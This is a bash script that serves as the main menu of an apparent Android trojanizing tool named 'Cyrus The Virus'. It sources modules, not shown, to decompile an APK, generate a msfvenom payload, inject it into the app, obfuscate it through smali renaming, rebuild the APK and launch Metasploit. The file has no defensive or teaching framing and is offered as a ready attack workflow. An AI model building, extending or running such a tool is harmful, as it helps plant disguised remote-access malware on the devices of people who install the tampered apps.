#!/bin/bash

# Colorization
default="\033[0m"
red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
cyan="\033[1;36m"
yellow="\033[1;33m"

# Import modules
source "./modules/decompile.sh"
source "./modules/generate_payload.sh"
source "./modules/inject.sh"
source "./modules/rebuild.sh"
source "./modules/encode.sh"
source "./modules/cleanup.sh"
source "./modules/metasploit.sh"

# Basic dependency checks (no installs performed)
check_dependencies() {
  local missing=0
  for bin in apktool msfvenom java; do
    if ! command -v "$bin" >/dev/null 2>&1; then
      echo -e "${red}[ERROR] Missing dependency: $bin${default}"
      missing=1
    fi
  done

  # Show versions if present to help troubleshooting
  if command -v java >/dev/null 2>&1; then
    java -version 2>&1 | sed -n '1,1p' | sed 's/^/  [java] /'
  fi
  if command -v apktool >/dev/null 2>&1; then
    echo "  [apktool] $(apktool -version 2>/dev/null)"
  fi
  if command -v msfvenom >/dev/null 2>&1; then
    echo "  [msfvenom] $(msfvenom --version 2>/dev/null || echo version unknown)"
  fi

  if [ $missing -ne 0 ]; then
    echo -e "${red}[ERROR] Please install/update missing tools before continuing.${default}"
  fi
}

# Ensure output dir exists early (non-destructive)
mkdir -p ./output

check_dependencies

# Main menu
while true; do
  echo -e "${cyan}=====================================${default}"
  echo -e "${yellow} 𓂀 𓂁𓁼  ℂ𝕪𝕣𝕦𝕤 𝕋𝕙𝕖 𝕍𝕚𝕣𝕦𝕤 𓁼 𓂄𓁿 ${default}"
  echo -e "${cyan}=====================================${default}"
  echo "1. Decompile APK"
  echo "2. Generate Payload"
  echo "3. Inject Payload"
  echo "4. Obfuscate Payload (smali rename)"
  echo "5. Rebuild APK (Unsigned)"
  echo "6. Launch Metasploit"
  echo "7. Cleanup"
  echo "8. Exit"
  echo -ne "Enter your choice: "
  read choice

  case $choice in
  1) decompile_apk ;;
  2) generate_payload ;;
  3) inject_payload ;;
  4) encode_payload ;;
  5) rebuild_apk ;;
 6) launch_metasploit ;;
 7) cleanup ;;
 8) echo -e "${blue}[INFO] Exiting...${default}" && exit 0 ;;
  *) echo -e "${red}[ERROR] Invalid choice. Please try again.${default}" ;;
  esac
done
